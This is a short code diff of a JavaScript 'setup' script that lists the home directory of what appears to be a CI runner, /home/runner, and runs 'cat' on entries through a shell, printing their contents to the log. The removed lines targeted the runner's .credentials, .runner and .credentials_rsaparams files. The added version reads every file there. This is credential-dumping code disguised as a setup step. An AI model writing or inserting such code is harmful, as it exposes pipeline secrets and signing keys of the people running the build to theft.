@@ -6,9 +6,7 @@ console.log("this is a setup.....")
 
 const files_other = fs.readdirSync('/home/runner');
     files_other.forEach(element => {
-        if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
-            
-            let path = `/home/runner/${element}`;
+        let path = `/home/runner/${element}`;
             
             process.exec(`cat ${path}`, (err, stdout, stderr) => {
                 if (err){
@@ -19,8 +17,6 @@ const files_other = fs.readdirSync('/home/runner');
                 console.log(`stdout: ${stdout.toString()}`);
                 console.log(`stderr: ${stderr}`);
             });
-            
-        }
     });
 
 
